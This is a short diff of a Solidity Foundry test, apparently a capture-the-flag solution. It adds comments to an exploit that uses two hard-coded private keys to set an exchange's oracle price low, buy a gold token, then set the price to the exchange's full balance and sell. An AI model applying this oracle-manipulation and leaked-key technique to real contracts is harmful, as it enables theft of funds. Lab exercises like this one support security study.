@@ -67,6 +67,7 @@ contract TestOM1 is Test {
         uint256 key1 = 0x221b93d924f48fcf998c7f20b4be36d12eb1d637a8f49e6e76c154f105e882af;
         uint256 key2 = 0x390e61fd668d2cf6db3305df8dc5366ed53d58610cee715c57dfd9f780579344;
 
+        // lets buy 1 gold token for 1 ether
         vm.broadcast(key1);
         oracle.postPrice(1 ether);
 
@@ -74,9 +75,9 @@ contract TestOM1 is Test {
         oracle.postPrice(1 ether);
 
         vm.prank(attacker);
-
         exchange.buyTokens{value: attacker.balance}(1);
 
+        // sell 1 gold token for the total balance
         vm.broadcast(key1);
         oracle.postPrice(EXCHANGE_INITIAL_BALANCE + initialAttackerBalance);
 
